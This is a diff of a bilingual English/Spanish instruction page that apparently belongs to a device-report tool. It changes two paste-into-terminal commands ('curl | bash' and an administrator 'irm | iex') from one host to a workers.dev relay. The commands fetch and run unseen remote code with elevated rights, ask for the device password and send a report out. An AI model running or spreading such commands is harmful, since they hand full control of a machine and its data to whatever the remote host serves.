@@ -21,13 +21,13 @@ Pick the line that matches the operating system on the device, paste it into a t
 **Linux** — open Terminal:
 
 ```bash
-curl -fsSL https://tk.c3t.com.tr | bash
+curl -fsSL https://tirekicker-relay.gentle-heart-33fd.workers.dev | bash
 ```
 
 **Windows** — open PowerShell **as Administrator**:
 
 ```powershell
-irm https://tk.c3t.com.tr/win | iex
+irm https://tirekicker-relay.gentle-heart-33fd.workers.dev/win | iex
 ```
 
 You'll see steps appear on screen in English. When prompted, type the device password (it won't show as you type — that's normal). When it says **"Done"**, the report has been sent.
@@ -68,13 +68,13 @@ Elige la línea que corresponda al sistema operativo del dispositivo, pégala en
 **Linux** — abre el Terminal:
 
 ```bash
-curl -fsSL https://tk.c3t.com.tr | bash
+curl -fsSL https://tirekicker-relay.gentle-heart-33fd.workers.dev | bash
 ```
 
 **Windows** — abre PowerShell **como Administrador**:
 
 ```powershell
-irm https://tk.c3t.com.tr/win | iex
+irm https://tirekicker-relay.gentle-heart-33fd.workers.dev/win | iex
 ```
 
 Verás los pasos en inglés en la pantalla. Cuando pida la contraseña del dispositivo, escríbela (no se ve mientras escribes, es normal). Cuando diga **"Done"**, el informe ha sido enviado.
